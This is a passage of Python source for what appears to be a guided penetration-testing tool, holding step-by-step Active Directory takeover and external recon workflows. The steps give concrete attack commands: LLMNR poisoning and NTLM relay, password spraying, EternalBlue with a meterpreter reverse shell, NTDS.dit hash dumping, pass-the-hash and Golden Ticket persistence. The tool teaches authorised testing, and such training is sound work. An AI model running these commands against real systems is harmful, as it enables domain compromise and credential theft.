                "-p 88        Kerberos — confirms this is a DC, needed for Kerberoasting\n"
                "-p 389/636   LDAP/LDAPS — directory service, enumerable without creds\n"
                "-p 445       SMB — shares, pass-the-hash, relay attacks\n"
                "-p 5985      WinRM — PowerShell remoting (crackmapexec winrm to access)\n"
                "-p 3268/3269 Global Catalog — queries the entire forest, not just one domain\n"
                "-sC          Default scripts grab LDAP root DSE and SMB banners automatically"
            ),
            look_for=(
                "Domain name in LDAP output: DC=corp,DC=local — your Kerberos realm.\n"
                "NetBIOS domain name in SMB banner: CORP — used in crackmapexec attacks.\n"
                "Windows Server version: 2008/2012 — likely vulnerable to older exploits.\n"
                "Port 5985 open — WinRM accessible, valid creds = immediate shell.\n"
                "SMB signing: required — relay attacks won't work. disabled — they will."
            ),
            tip=(
                "The nmap -sC output on port 389 (LDAP) will include the full domain name, "
                "supported SASL mechanisms, and often the forest and domain functional levels. "
                "The domain functional level tells you which Kerberos features are enabled "
                "and which legacy attacks (like MS14-068) are possible."
            ),
        ),

        WorkflowStep(
            title="Unauthenticated User & Policy Enumeration",
            what=(
                "Many Active Directory environments allow LDAP and SMB enumeration "
                "without any credentials — this is a default configuration that IT teams "
                "frequently leave in place. Enum4linux extracts domain usernames, group "
                "memberships, and the password policy without needing any account. "
                "The password policy tells you exactly how many spray attempts you can "
                "make before accounts start locking."
            ),
            command="enum4linux -a <dc_ip>",
            flags=(
                "-a         Full enumeration: users, groups, shares, OS, policy, RID cycling\n"
                "-U         Users only (faster)\n"
                "-P         Password policy only — run this first before spraying\n"
                "-G         Groups — shows who is in Domain Admins, IT, etc.\n"
                "-S         Shares — lists available SMB shares on the DC"
            ),
            look_for=(
                "user:[jsmith] rid:[0x44f] — every username in the domain. Save to users.txt.\n"
                "Domain Users, Domain Admins group members — DA accounts are prime targets.\n"
                "Minimum password length: 8 — expect weak passwords to exist.\n"
                "Account Lockout Threshold: 0 — NO lockout, safe to brute-force freely.\n"
                "Account Lockout Threshold: 5 — you get 4 attempts per account before lockout.\n"
                "Observation Period: 30 minutes — wait this long between spray rounds."
            ),
            tip=(
                "If enum4linux fails (newer DCs often restrict anonymous enumeration), try: "
                "crackmapexec smb <dc_ip> --users --groups --pass-pol -u '' -p '' "
                "(explicit empty credentials). Also: nmap --script ldap-rootdse,ldap-brute "
                "-p 389 <dc_ip> uses LDAP directly to pull domain info."
            ),
        ),

        WorkflowStep(
            title="Map SMB Hosts & Signing Status",
            what=(
                "CrackMapExec scans the entire subnet via SMB in seconds, showing every "
                "Windows host, its OS version, and whether SMB signing is enabled. "
                "Hosts with signing disabled are vulnerable to NTLM relay attacks — "
                "if you can capture an authentication attempt (via Responder) you can "
                "relay it to these hosts for a shell without knowing the password. "
                "This command also identifies which hosts are domain-joined."
            ),
            command=(
                "crackmapexec smb 10.0.0.0/24 "
                "--gen-relay-list relay_targets.txt"
            ),
            flags=(
                "smb                    SMB protocol enumeration\n"
                "10.0.0.0/24            Target subnet\n"
                "--gen-relay-list file  Write hosts with SMB signing disabled to a file\n"
                "                       These are relay targets for ntlmrelayx\n"
                "--users                Enumerate domain users (needs valid credential)\n"
                "--groups               Enumerate groups (needs valid credential)\n"
                "--shares               List accessible shares (needs valid credential)"
            ),
            look_for=(
                "signing:False — this host is vulnerable to NTLM relay, add to targets.\n"
                "signing:True (required) — relay attacks will fail against this host.\n"
                "Windows 7 / Server 2008 — old OS, likely unpatched for EternalBlue.\n"
                "domain:CORP — confirms domain membership, useful for pass-the-hash."
            ),
            tip=(
                "If you have Responder available, run it on your interface while "
                "users are active on the network: responder -I eth0 -rdwv. "
                "It poisons LLMNR/NBT-NS queries and captures NTLMv2 hashes. "
                "Pass relay_targets.txt to ntlmrelayx: "
                "ntlmrelayx.py -tf relay_targets.txt -smb2support"
            ),
        ),

        WorkflowStep(
            title="Password Spraying",
            what=(
                "Corporate environments almost always have at least one account with a "
                "weak or predictable password. Password spraying tries ONE password "
                "against ALL accounts — this maximises coverage while minimising lockout "
                "risk. You are not brute-forcing one account; you are checking if anyone "
                "uses a specific password. Wait the full observation period between rounds. "
                "Even one valid credential transforms the engagement."
            ),
            command=(
                "crackmapexec smb <dc_ip> "
                "-u users.txt -p 'Password2024!' "
                "--continue-on-success"
            ),
            flags=(
                "-u users.txt            Usernames from enum4linux (one per line)\n"
                "-p 'Password2024!'      ONE password per spray round\n"
                "--continue-on-success   Keep trying all users even after first hit\n"
                "-d CORP                 Specify domain name explicitly if needed\n\n"
                "Password spray order (most likely first):\n"
                "  Password1, Password2024!, Welcome1, Summer2024!, Fall2024!\n"
                "  CompanyName1, CompanyName2024, [Month][Year]! (August2024!)\n"
                "  Blank password for service accounts"
            ),
            look_for=(
                "[+] CORP\\jsmith:Password2024! — account with valid credentials found.\n"
                "(Pwn3d!) — that account has local admin rights on the DC or host.\n"
                "Multiple [+] for same password — widespread weak password use.\n"
                "Domain Admin in the compromised username's group — full DA compromise."
            ),
            tip=(
                "Got Domain Admin credentials? You now own the domain. Verify with: "
                "crackmapexec smb <dc_ip> -u <user> -p <pass> --shares — you should see "
                "SYSVOL and NETLOGON shares accessible. "
                "With DA creds: crackmapexec smb <dc_ip> -u <user> -p <pass> --ntds "
                "dumps the entire NTDS.dit (all domain password hashes) remotely."
            ),
        ),

        WorkflowStep(
            title="EternalBlue / Critical Exploitation",
            what=(
                "If the DC is running Windows Server 2008/2012/2016 and has not been "
                "patched (common in legacy environments), MS17-010 will give you a "
                "SYSTEM shell directly on the domain controller — which means full "
                "domain compromise in a single step. This is the most impactful finding "
                "possible in an Active Directory engagement."
            ),
            command="msf use exploit/windows/smb/ms17_010_eternalblue",
            flags=(
                "Required options after loading:\n"
                "  set RHOSTS <dc_ip>                       The domain controller IP\n"
                "  set LHOST <your_ip>                      Your attacking machine IP\n"
                "  set PAYLOAD windows/x64/meterpreter/reverse_tcp\n"
                "  check                                    Verify vulnerable before firing\n"
                "  run\n\n"
                "If the DC is patched, try instead:\n"
                "  use auxiliary/admin/kerberos/ms14_068_kerberos_checksum (MS14-068)\n"
                "  use exploit/windows/smb/ms08_067_netapi (Server 2003/XP only)\n"
                "  use auxiliary/scanner/rdp/cve_2019_0708_bluekeep (BlueKeep, Win7/2008)"
            ),
            look_for=(
                "meterpreter > — shell on the DC, you own the domain.\n"
                "getuid → NT AUTHORITY\\SYSTEM — highest privilege on Windows.\n"
                "sysinfo → Machine: DC01, Domain: CORP — confirms you're on the DC.\n"
                "If check says 'The target appears to be vulnerable' — run it."
            ),
            tip=(
                "SYSTEM on the DC means you can dump the entire domain with: "
                "run post/windows/gather/credentials/domain_hashdump — this reads "
                "NTDS.dit and extracts every single domain account's NTLM hash. "
                "The resulting hash list can be cracked offline or used for "
                "pass-the-hash against every machine in the domain."
            ),
        ),

        WorkflowStep(
            title="Domain Hash Dump",
            what=(
                "With SYSTEM-level access on the DC, you can extract the NTDS.dit file "
                "which contains every domain account's password hash. This is the most "
                "sensitive data in an Active Directory environment — it represents "
                "complete domain compromise. Once you have the krbtgt hash specifically, "
                "you can forge Golden Tickets that give permanent domain admin access "
                "even after the password is changed."
            ),
            command="msf use post/windows/gather/credentials/domain_hashdump",
            flags=(
                "Set SESSION to your active Meterpreter session number:\n"
                "  set SESSION 1\n"
                "  run\n\n"
                "Alternative — run directly in Meterpreter:\n"
                "  hashdump                             (local SAM only)\n"
                "  run post/windows/gather/smart_hashdump  (more thorough)\n\n"
                "Or use secretsdump (outside SpectreNet):\n"
                "  secretsdump.py CORP/Administrator:<pass>@<dc_ip>"
            ),
            look_for=(
                "krbtgt:502:NTLM_HASH — the Kerberos service account hash, enables Golden Tickets.\n"
                "Administrator:500:NTLM_HASH — built-in admin, works on all domain machines.\n"
                "Every enabled user account hash — save all to loot vault.\n"
                "Format: username:RID:LM_hash:NTLM_hash — NTLM is the rightmost hash."
            ),
            tip=(
                "Crack DA hashes offline with: hashcat -m 1000 ntds_hashes.txt rockyou.txt. "
                "Or use pass-the-hash for lateral movement without cracking: "
                "crackmapexec smb 10.0.0.0/24 -u Administrator -H <ntlm_hash>. "
                "Save the krbtgt hash — even if you lose access, it can recreate "
                "domain admin access via Golden Ticket: valid for 10 years by default."
            ),
        ),

        WorkflowStep(
            title="Document & Report",
            what=(
                "Domain compromise is the most severe finding in a corporate pentest. "
                "Document the full attack chain: how you got the first credential, "
                "how you reached the DC, what level of access was achieved, and what "
                "an attacker could have done from this position. The remediation section "
                "should prioritise patching, password policy enforcement, and privileged "
                "account separation."
            ),
            command="report html",
            flags=(
                "Before running report, save all hashes and credentials:\n"
                "  loot add hash krbtgt:<hash>\n"
                "  loot add hash Administrator:<hash>\n"
                "  loot add cred CORP\\jsmith:Password2024!\n"
                "  note CRITICAL: Full domain compromise — krbtgt hash extracted,\n"
                "       Golden Ticket persistence possible\n"
                "  report html"
            ),
            look_for=(
                "Report saved to spectrenet_report_<timestamp>.html.\n"
                "Key sections to check: Findings (should show Critical), Loot (all hashes), Timeline."
            ),
            tip=(
                "The attack path narrative matters as much as the technical findings. "
                "Clients need to understand: 'An attacker could have accessed every "
                "system in the domain, read all emails, encrypted all files for ransom, "
                "or remained undetected for months with Golden Ticket persistence.' "
                "Quantify impact, don't just list CVE numbers."
            ),
        ),
    ],
))


# ---------------------------------------------------------------------------
# Workflow 5 — Passive External Reconnaissance
# ---------------------------------------------------------------------------

_reg(Workflow(
    id="recon",
    name="Passive External Recon",
    difficulty="Beginner",
    description=(
        "Non-intrusive intelligence gathering before active testing. "
        "Covers subdomain enumeration → Shodan intelligence → port scanning → "
        "CVE scanning → technology fingerprinting → documentation."
    ),
    steps=[

        WorkflowStep(
            title="Subdomain Discovery",
            what=(
                "Subfinder queries passive DNS sources — Certificate Transparency logs, "
                "VirusTotal, Shodan, SecurityTrails, and others — to find every subdomain "
                "registered for a domain without sending a single packet to the target. "
                "Subdomains reveal the full attack surface: dev and staging environments "
                "are often years behind on patches, internal tools are accidentally exposed, "
                "and forgotten services run outdated software with no monitoring."
            ),
            command="subfinder <domain>",
            flags=(
                "subfinder example.com              Basic passive enumeration\n"
                "subfinder -d example.com -o subs.txt  Save to file\n"
                "subfinder -d example.com -v           Verbose — shows which sources found each subdomain\n"
                "subfinder -dL domains.txt             Multiple domains from a file\n\n"
                "High-value subdomain prefixes to look for:\n"
                "  dev., staging., test., uat. — development environments\n"
                "  admin., portal., internal. — admin interfaces\n"
                "  vpn., remote., citrix. — remote access (credential attacks)\n"
                "  api., api-v2., gateway. — API services, often less secured\n"
                "  mail., webmail., owa. — email services"
            ),
            look_for=(
                "dev.target.com, staging.target.com — development environments, less hardened.\n"
                "admin.target.com — admin panel exposed to the internet.\n"
                "vpn.target.com, remote.target.com — remote access portals, test default creds.\n"
                "*.s3.amazonaws.com references — cloud storage, check for public bucket access.\n"
                "mail.target.com, owa.target.com — Exchange/OWA, try password spraying."
            ),
            tip=(
                "After collecting subdomains, resolve all of them to IPs: "
                "cat subs.txt | while read sub; do host $sub 2>/dev/null | grep 'has address'; done. "
                "Subdomains pointing to cloud providers (AWS, Azure, GCP) may be "
                "takeover candidates if the underlying resource was deleted — "
                "check if unclaimed S3 buckets or Azure subdomains are still in DNS."
            ),
        ),

        WorkflowStep(
            title="Shodan Intelligence Gathering",
            what=(
                "Shodan continuously scans the entire internet and stores every banner, "
                "certificate, and response it collects. Querying Shodan for your target's "
                "IP reveals what ports are open, what software versions are running, "
                "and what CVEs have been flagged — all from data collected by Shodan's "
                "scanners, not by you. This gives you intelligence without generating "
                "a single packet to the target network."
            ),
            command="shodan <ip_address>",
            flags=(
                "shodan <ip>              Look up a specific IP address\n"
                "shodan <domain>          Look up by domain (resolves to IP first)\n\n"
                "Shodan requires an API key. If not configured:\n"
                "  snet config set-key shodan <your_api_key>\n"
                "  Or get a free key at account.shodan.io\n\n"
                "Shodan web searches (at shodan.io) for manual research:\n"
                "  hostname:target.com             All hosts under the domain\n"
                "  org:'Company Name'              All IPs owned by the company\n"
                "  ssl.cert.subject.cn:target.com  Hosts with matching SSL cert"
            ),
            look_for=(
                "Open ports beyond 80/443 — unexpected services exposed to the internet.\n"
                "Software versions — match these against CVE databases.\n"
                "CVEs listed directly — Shodan flags known vulnerabilities it detects.\n"
                "Banners containing version strings — default login pages, admin interfaces.\n"
                "Historical data — shows what was running months ago, reveals patterns."
            ),
            tip=(
                "Shodan sometimes shows ports that are filtered from your IP but not from "
                "Shodan's scanners. If Shodan shows a service that nmap misses in step 3, "
                "try connecting directly: nc -nv <ip> <port>. "
                "The Shodan free tier is limited — a paid account (or even the $49 one-time "
                "lifetime membership) is worth it for serious engagements."
            ),
        ),

        WorkflowStep(
            title="Active Port & Service Scan",
            what=(
                "Now actively scan the target to confirm what passive recon found and "
                "discover anything Shodan missed. Your scan will appear in the target's "
                "logs — this is the first 'noisy' step in the workflow. Run it against "
                "the main target IP and then repeat for each interesting subdomain found "
                "in step 1."
            ),
            command="nmap -T4 -sV -sC <target>",
            flags=(
                "-T4       Aggressive timing — fast but will show in firewall logs\n"
                "-sV       Detect exact service versions — critical for CVE matching\n"
                "-sC       Run default NSE scripts: grabs SSL certs, HTTP headers,\n"
                "          SSH host keys, SMB banners, LDAP info automatically\n\n"
                "For a quieter scan (IDS evasion):\n"
                "  nmap -T2 -sS -f <target>    (-f fragments packets, harder to detect)\n"
                "For deeper coverage:\n"
                "  nmap -T4 -sV -sC -p- <target>  (all 65535 ports, takes longer)"
            ),
            look_for=(
                "Server header versions — cross-reference with CVE database and searchsploit.\n"
                "SSL cert details — expiry date, weak ciphers, self-signed cert.\n"
                "SSH host key algorithms — old RSA-1 or DSA keys indicate old configuration.\n"
                "HTTP title: reveals the application name (WordPress, Joomla, Tomcat, etc.).\n"
                "Anything that differs from what Shodan showed — might be a less-monitored path."
            ),
            tip=(
                "Use -sV --version-intensity 9 for the most aggressive version detection — "
                "it sends more probes and identifies more services. Pair with: "
                "nmap --script http-title,http-headers,http-methods -p 80,443,8080,8443 <target> "
                "to extract HTTP-specific details without running all default scripts."
            ),
        ),

        WorkflowStep(
            title="CVE & Exposure Scan",
            what=(
                "Nuclei runs hundreds of templates that check for specific CVEs and "
                "exposures. Unlike a generic vulnerability scanner, each Nuclei template "
                "is written for one specific issue and uses the actual PoC request to "
                "confirm it. A match means the vulnerability is confirmed present, "
                "not just theoretically possible based on version numbers."
            ),
            command=(
                "nuclei -u https://<target> "
                "-t cves/ -t exposures/ -t technologies/ "
                "-severity medium,high,critical "
                "-o nuclei_results.txt"
            ),
            flags=(
                "-u <url>              Target URL\n"
                "-t cves/              CVE detection templates (thousands of specific CVEs)\n"
                "-t exposures/         Exposed admin panels, credentials, files\n"
                "-t technologies/      Identify running technologies (confirms stack)\n"
                "-severity             Only run templates at or above this severity\n"
                "-o <file>             Save results\n"
                "-update-templates     Always run this before an engagement for latest templates"
            ),
            look_for=(
                "[critical] — confirmed critical vulnerability, immediate action needed.\n"
                "[high] — high severity, confirmed exploitable condition.\n"
                "tech: WordPress 5.x, Joomla 3.x — confirms CMS and version.\n"
                "[exposed] — admin panels, .env files, git directories, debug endpoints.\n"
                "CVE numbers in output — use searchsploit <cve> to find exploit code."
            ),
            tip=(
                "Found a technology tag like 'wordpress' or 'joomla'? There are dedicated "
                "Nuclei template directories for these: -t cms/wordpress/ or -t cms/joomla/. "
                "These check for plugin vulnerabilities, default credentials, and "
                "CMS-specific exposures that the generic CVE templates don't cover."
            ),
        ),

        WorkflowStep(
            title="Technology Fingerprinting",
            what=(
                "WhatWeb identifies the exact technology stack — web framework, CMS, "
                "JavaScript libraries, hosting provider, server software, and analytics "
                "platforms. This maps the entire software supply chain of the target's "
                "web presence. Every identified component is a potential vulnerability "
                "vector: an outdated jQuery, a specific CMS plugin version, or a "
                "fingerprinted CDN can all point to known CVEs."
            ),
            command="whatweb -a 3 <url>",
            flags=(
                "-a 1    Passive — no extra requests, just analyses initial response\n"
                "-a 3    Aggressive — sends additional requests to confirm detections\n"
                "-a 4    Very aggressive — maximum detection but very noisy\n"
                "--log-json <file>  Save output as JSON for parsing\n"
                "--user-agent 'Mozilla/5.0...'  Spoof browser user agent\n"
                "Note: run against every subdomain found in step 1"
            ),
            look_for=(
                "WordPress[5.x] — run WPScan for plugin CVEs: wpscan --url <target> --enumerate p\n"
                "Joomla[3.x] — check searchsploit for Joomla 3.x RCE modules.\n"
                "jQuery[1.x] — old version, check for prototype pollution and XSS.\n"
                "PHP[7.2] — version may have CVEs, cross-check with nuclei results.\n"
                "CloudFlare — note that the real IP is hidden, Shodan may have found it.\n"
                "Apache Struts — check searchsploit apache struts (multiple RCE CVEs)."
            ),
            tip=(
                "If WhatWeb detects WordPress, run: wpscan --url https://<target> "
                "--enumerate u,p,t (users, plugins, themes). "
                "A single vulnerable plugin — and there are thousands — can give you "
                "file upload or RCE regardless of how patched the core WordPress install is."
            ),
        ),

        WorkflowStep(
            title="Document & Structure Findings",
            what=(
                "Reconnaissance is valuable only if it's documented. Add a note for "
                "every significant finding: exposed admin panels, identified CMS versions, "
                "interesting subdomains, Shodan-flagged CVEs. These notes populate the "
                "final report and become the roadmap for the active exploitation phase. "
                "A well-documented recon phase saves hours during exploitation — you know "
                "exactly what to target and why."
            ),
            command="note <your finding here>",
            flags=(
                "note <text>     Add a note to the workspace (appears in the report)\n"
                "workspace       Review all notes and commands from this session\n"
                "report html     Generate the recon report\n\n"
                "Examples of notes to add:\n"
                "  note dev.target.com resolves to 10.1.2.3 — development environment\n"
                "  note Shodan flags CVE-2021-44228 (Log4Shell) on mail.target.com:8080\n"
                "  note WhatWeb detects WordPress 5.8.1 on blog.target.com\n"
                "  note Admin panel at https://target.com/wp-admin — default creds untested"
            ),
            look_for=(
                "Note saved — confirmed entry recorded.\n"
                "After 'workspace': all notes listed chronologically.\n"
                "After 'report html': notes appear in the Findings section of the report."
            ),
            tip=(
                "End every recon engagement with a prioritised target list: "
                "1) Anything with a confirmed CVE (Nuclei critical hits), "
                "2) Admin panels and login forms, "
                "3) Dev/staging environments, "
                "4) Outdated CMS installs, "
                "5) Everything else. "
                "This prioritisation drives the exploitation phase and shows clients "
                "you understand the risk hierarchy, not just the technical details."
            ),
        ),
    ],
))


# ---------------------------------------------------------------------------
# GuidePanel widget
# ---------------------------------------------------------------------------

class GuidePanel(Static):
    """Left sidebar that displays the current guided workflow step."""

    DEFAULT_CSS = f"""
    GuidePanel {{
        width: 46;
        background: {NAVY};
        border-right: solid {NAVY_LIGHT};
        padding: 1 2;
        display: none;
        overflow-y: auto;
    }}
    """

    def render_step(self, workflow: Workflow, step_idx: int) -> None:
        step  = workflow.steps[step_idx]
        total = len(workflow.steps)

        # Progress bar: filled squares up to current, empty after
        bar = "".join(
            f"[bold {CYAN}]■[/]" if i <= step_idx else f"[{GREY}]□[/]"
            for i in range(total)
        )

        lines: list[str] = [
            f"[bold {CYAN}]{workflow.name}[/]",
            f"[{GREY}]{workflow.difficulty}[/]",
            "",
            f"{bar}  [{GREY}]{step_idx + 1}/{total}[/]",
            f"[{NAVY_LIGHT}]{'─' * 40}[/]",
            "",
            f"[bold {WHITE}]Step {step_idx + 1}: {step.title}[/]",
            "",
        ]

        # What / Why
        for line in _wrap(step.what, 40):
            lines.append(f"[{GREY}]{line}[/]")

        lines += [
            "",
            f"[bold {CYAN}]Command:[/]",
        ]
        for cmd_line in step.command.split("\n"):
            lines.append(f"[bold {WHITE}]  {cmd_line}[/]")

        lines += [
            "",
            f"[bold {CYAN}]Flags explained:[/]",
        ]
        for flag_line in step.flags.split("\n"):
            lines.append(f"[{GREY}]  {flag_line}[/]")

        lines += [
            "",
            f"[bold {CYAN}]Look for in output:[/]",
        ]
        for lf_line in step.look_for.split("\n"):
            lines.append(f"[{GREY}]  {lf_line}[/]")

        if step.tip:
            lines += [
                "",
                f"[{WARNING}]Pro tip:[/]",
            ]
            for tip_line in _wrap(step.tip, 40):
                lines.append(f"[{GREY}]{tip_line}[/]")

        lines += [
            "",
            f"[{NAVY_LIGHT}]{'─' * 40}[/]",
        ]

        # Navigation
        nav_parts: list[str] = []
        if step_idx > 0:
            nav_parts.append(f"[bold {CYAN}]guide back[/]")
        if step_idx < total - 1:
            nav_parts.append(f"[bold {CYAN}]guide next[/]")
        else:
            nav_parts.append(f"[{SUCCESS}]Workflow complete![/]")
        nav_parts.append(f"[{GREY}]guide stop[/]")

        lines.append("  ".join(nav_parts))

        self.update("\n".join(lines))


def _wrap(text: str, width: int) -> list[str]:
    """Naive word-wrap to a fixed column width."""
    words  = text.split()
    lines: list[str] = []
    current = ""
    for word in words:
        if current and len(current) + 1 + len(word) > width:
            lines.append(current)
            current = word
        else:
            current = (current + " " + word).strip()
    if current:
        lines.append(current)
    return lines or [""]
